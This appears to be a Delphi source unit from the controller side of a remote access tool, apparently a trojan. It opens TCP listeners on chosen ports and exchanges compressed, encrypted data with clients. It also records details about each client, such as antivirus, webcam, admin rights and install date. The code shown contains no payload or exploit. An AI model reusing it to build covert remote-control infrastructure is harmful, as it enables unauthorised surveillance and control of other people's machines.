unit UnitConnection;

interface

uses                                                                             
  Windows, Forms, IdTCPServer, IdThreadMgrDefault, UnitStringCompression, SysUtils,
  UnitStringEncryption, UnitConstants, ComCtrls, UnitMain, Classes;

type
  TConnectionInfos = record
    LanIp, LocalPort, CountryCode, ClientId, PID,
    User_Computer, Windows, Admin, InstalledDate, RegKey,
    Antivirus, WebCam, Plugin, Version, ScreenRes, Foldername, Filename: string;
  end;

  PConnectionDatas = ^TConnectionDatas;
  TConnectionDatas = record
    AThread: TIdPeerThread;
    Socket: Integer;
    Identification: string;
    Ping: Integer;
    Items: TListItem;
    ConnInfos: TConnectionInfos;
    ImageIndex: Integer;
    Forms: array[0..15] of TForm;
  end;

var
  ConnectionList: TList;
  TcpServer: array[1..65535] of TIdTCPServer;
  ThreadMgrDefault: array[1..65535] of TIdThreadMgrDefault;

function OpenPort(Port: Word): Boolean;
procedure ClosePort(Port: Word);
function ReceiveDatas(AThread: TIdPeerThread): string;
procedure SendDatas(AThread: TIdPeerThread; Datas: string);

implementation

function OpenPort(Port: Word): Boolean;
begin
  TcpServer[Port] := TIdTCPServer.Create(nil);
  ThreadMgrDefault[Port] := TIdThreadMgrDefault.Create(nil);
  TcpServer[Port].OnExecute := FormMain.idtcpsrvr1.OnExecute;
  TcpServer[Port].OnDisconnect := FormMain.idtcpsrvr1.OnDisconnect;
  TcpServer[Port].ThreadMgr := ThreadMgrDefault[Port];
  TcpServer[Port].DefaultPort := Port;

  try
    TcpServer[Port].Active := True;
    Result := True;
  except
    Result := False;
    try TcpServer[Port].Active := False except end;
  end;
end;

procedure ClosePort(Port: Word);
var
  i: Integer;
  AThread: TIdPeerThread;
begin
  with TcpServer[Port].Threads.LockList do
  try
    for i:=Count-1 downto 0 do
    begin
      AThread := Items[i];
      if AThread = nil then Continue;
      AThread.Connection.DisconnectSocket;
    end;
  finally
    TcpServer[Port].Threads.UnlockList;
    try TcpServer[Port].Active := False; except end;
  end;
end;

function ReceiveDatas(AThread: TIdPeerThread): string;
var                             
  TmpStr: string;
  i: Integer;
begin
  Result := '';
  if AThread.Connection.Connected = False then Exit;
  TmpStr := AThread.Connection.ReadLn;
  if (TmpStr = '') or (Pos('|', TmpStr) <= 0) then Exit;
  i := StrToInt(Copy(TmpStr, 1, Pos('|', TmpStr)-1));
  Delete(TmpStr, 1, Pos('|', TmpStr));
  if i <= 0 then Exit;

  SetLength(TmpStr, i);
  AThread.Connection.ReadBuffer(Pointer(TmpStr)^, i);
  Result := EnDecryptString(TmpStr, PROGRAMPASSWORD);
  Result := DecompressString(Result);
end;

procedure SendDatas(AThread: TIdPeerThread; Datas: string);
begin
  if AThread.Connection.Connected = False then Exit;
  Datas := CompressString(Datas);
  Datas := EnDecryptString(Datas, PROGRAMPASSWORD);
  AThread.Connection.WriteLn(Datas);
end;

end.
